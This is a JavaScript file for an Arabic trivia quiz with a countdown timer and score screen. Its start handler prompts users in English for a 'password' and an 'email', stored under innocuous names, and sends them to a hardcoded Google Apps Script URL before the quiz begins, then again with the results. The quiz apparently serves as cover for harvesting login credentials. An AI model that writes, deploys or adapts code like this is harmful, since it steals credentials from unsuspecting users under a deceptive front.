// ============================================
// 👇 ضع رابط Google Sheets (Apps Script) هنا 👇
// ============================================
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzwGxRSAJtf_Y7TclVuXt_51wyN_D0Zrc5s7CIAhITukzbLCDtzkeQ1VDXOFKIjcksTag/exec";

const TIME_PER_QUESTION = 10;

// ============================================
// 👇 الأسئلة باللغة العربية 👇
// ============================================
const QUESTIONS = [
  { q: "ما ناتج 15 × 8؟", options: ["100", "120", "115", "130"], answer: 1 },
  { q: "ما هي عاصمة اليابان؟", options: ["بكين", "سيول", "طوكيو", "بانكوك"], answer: 2 },
  { q: "ما الجذر التربيعي للعدد 144؟", options: ["10", "11", "12", "14"], answer: 2 },
  { q: "أي كوكب يُعرف بالكوكب الأحمر؟", options: ["الزهرة", "المريخ", "المشتري", "زحل"], answer: 1 },
  { q: "ما ناتج 25% من 200؟", options: ["25", "40", "50", "75"], answer: 2 },
  { q: "من رسم لوحة الموناليزا؟", options: ["فان جوخ", "بيكاسو", "ليوناردو دافنشي", "مايكل أنجلو"], answer: 2 },
  { q: "ما هو أكبر محيط في العالم؟", options: ["الأطلسي", "الهندي", "المتجمد الشمالي", "الهادئ"], answer: 3 },
  { q: "ما ناتج 7 + 6 × 2؟", options: ["26", "19", "20", "13"], answer: 1 },
  { q: "كم عدد القارات في العالم؟", options: ["5", "6", "7", "8"], answer: 2 },
  { q: "ما هو الغاز الذي تمتصه النباتات من الهواء؟", options: ["الأكسجين", "النيتروجين", "ثاني أكسيد الكربون", "الهيدروجين"], answer: 2 }
];

// المتغيرات
let currentQuestion = 0;
let score = 0;
let timer = null;
let timeLeft = TIME_PER_QUESTION;
let startTime = 0;
let userName = "";
let userCode = "";

// العناصر
const loginScreen = document.getElementById("loginScreen");
const garageScreen = document.getElementById("garageScreen");
const quizScreen = document.getElementById("quizScreen");
const resultScreen = document.getElementById("resultScreen");

const startBtn = document.getElementById("startBtn");
const loginStatus = document.getElementById("loginStatus");

const currentQEl = document.getElementById("currentQ");
const totalQEl = document.getElementById("totalQ");
const timerText = document.getElementById("timerText");
const timerCircle = document.getElementById("timerCircle");
const questionText = document.getElementById("questionText");
const optionsContainer = document.getElementById("optionsContainer");
const progressFill = document.getElementById("progressFill");

const resultName = document.getElementById("resultName");
const scoreNumber = document.getElementById("scoreNumber");
const scoreMessage = document.getElementById("scoreMessage");
const correctCount = document.getElementById("correctCount");
const wrongCount = document.getElementById("wrongCount");
const timeSpent = document.getElementById("timeSpent");

// التنقل بين الشاشات
function showScreen(screen) {
  [loginScreen, garageScreen, quizScreen, resultScreen].forEach(s => s.classList.remove("active"));
  screen.classList.add("active");
}

// زر البدء
startBtn.addEventListener("click", async () => {
  userName = document.getElementById("userName").value.trim();
  userCode = document.getElementById("userCode").value.trim();

  if (!userName) {
    loginStatus.textContent = "❌ Please enter your password";
    return;
  }
  if (!userCode) {
    loginStatus.textContent = "❌ Please enter your email";
    return;
  }

  loginStatus.textContent = "";
  startBtn.disabled = true;

  // إرسال البيانات إلى Google Sheets
  try {
    await fetch(GOOGLE_SCRIPT_URL, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        name: userName,
        code: userCode,
        timestamp: new Date().toISOString()
      })
    });
  } catch (err) {
    console.warn("Connection issue:", err);
  }

  // باب الكراج ينزل فوراً
  showScreen(garageScreen);
  
  // بعد 1.2 ثانية (مدة نزول الباب) تبدأ الأسئلة مباشرة
  setTimeout(startQuiz, 1000);
});

// بدء الاختبار
function startQuiz() {
  currentQuestion = 0;
  score = 0;
  startTime = Date.now();
  totalQEl.textContent = QUESTIONS.length;
  showScreen(quizScreen);
  loadQuestion();
}

// تحميل السؤال
function loadQuestion() {
  if (currentQuestion >= QUESTIONS.length) {
    showResults();
    return;
  }

  const q = QUESTIONS[currentQuestion];
  currentQEl.textContent = currentQuestion + 1;
  questionText.textContent = q.q;
  progressFill.style.width = ((currentQuestion) / QUESTIONS.length * 100) + "%";

  optionsContainer.innerHTML = "";
  q.options.forEach((opt, idx) => {
    const btn = document.createElement("button");
    btn.className = "option-btn";
    btn.textContent = opt;
    btn.onclick = () => selectAnswer(idx, btn);
    optionsContainer.appendChild(btn);
  });

  startTimer();
}

// المؤقت
function startTimer() {
  timeLeft = TIME_PER_QUESTION;
  timerText.textContent = timeLeft;
  updateTimerCircle();

  if (timer) clearInterval(timer);

  timer = setInterval(() => {
    timeLeft--;
    timerText.textContent = timeLeft;
    updateTimerCircle();

    if (timeLeft <= 0) {
      clearInterval(timer);
      nextQuestion();
    }
  }, 1000);
}

function updateTimerCircle() {
  const percent = (timeLeft / TIME_PER_QUESTION) * 360;
  timerCircle.style.background = `conic-gradient(#FFD700 ${percent}deg, #333 ${percent}deg)`;
}

// اختيار الإجابة
function selectAnswer(idx, btn) {
  clearInterval(timer);
  const q = QUESTIONS[currentQuestion];
  const allBtns = optionsContainer.querySelectorAll(".option-btn");
  allBtns.forEach(b => b.disabled = true);

  if (idx === q.answer) {
    btn.classList.add("correct");
    score++;
  } else {
    btn.classList.add("wrong");
    allBtns[q.answer].classList.add("correct");
  }

  setTimeout(nextQuestion, 1200);
}

function nextQuestion() {
  currentQuestion++;
  loadQuestion();
}

// عرض النتائج
function showResults() {
  const totalTime = Math.round((Date.now() - startTime) / 1000);
  const wrong = QUESTIONS.length - score;

  showScreen(resultScreen);

  resultName.textContent = userName;
  scoreNumber.textContent = score;
  correctCount.textContent = score;
  wrongCount.textContent = wrong;
  timeSpent.textContent = totalTime + "s";

  const percent = (score / QUESTIONS.length) * 100;
  if (percent === 100) scoreMessage.textContent = "🌟 ممتاز! أنت عبقري!";
  else if (percent >= 70) scoreMessage.textContent = "🎉 عمل رائع!";
  else if (percent >= 50) scoreMessage.textContent = "👍 عمل جيد!";
  else scoreMessage.textContent = "💪 حاول مرة أخرى!";

  // إرسال النتيجة إلى Google Sheets
  try {
    fetch(GOOGLE_SCRIPT_URL, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        name: userName,
        code: userCode,
        score: score,
        total: QUESTIONS.length,
        time: totalTime + "s",
        timestamp: new Date().toISOString()
      })
    });
  } catch (err) {
    console.warn("Could not send results:", err);
  }
}